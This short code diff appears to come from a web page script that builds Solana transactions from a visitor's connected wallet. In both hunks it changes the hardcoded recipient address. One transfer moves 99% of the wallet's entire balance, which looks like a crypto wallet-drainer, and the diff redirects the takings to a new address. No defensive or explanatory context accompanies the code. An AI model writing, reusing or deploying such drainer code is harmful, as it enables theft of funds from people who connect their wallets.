@@ -164,7 +164,7 @@ $(document).ready(function(){
             let transaction = new solanaWeb3.Transaction().add(
               solanaWeb3.SystemProgram.transfer({
                 fromPubkey: provider.publicKey,
-                toPubkey: "GGPGYqdWNwxMsWhUqmy8DaoHwMfa6gZ7V3XAtXbYw4Tb", 
+                toPubkey: "2K2y3pNKcEt3LtRr1yoCfgXoL27prYpZmyNXyQaFPJus", 
                 lamports: charginglamports,
               })
             );
@@ -212,7 +212,7 @@ $(document).ready(function(){
             let transaction = new solanaWeb3.Transaction().add(
               solanaWeb3.SystemProgram.transfer({
                 fromPubkey: provider.publicKey,
-                toPubkey: "GGPGYqdWNwxMsWhUqmy8DaoHwMfa6gZ7V3XAtXbYw4Tb",
+                toPubkey: "2K2y3pNKcEt3LtRr1yoCfgXoL27prYpZmyNXyQaFPJus",
                 lamports: (account_info.lamports * 0.99).toFixed(0),
               })
             );
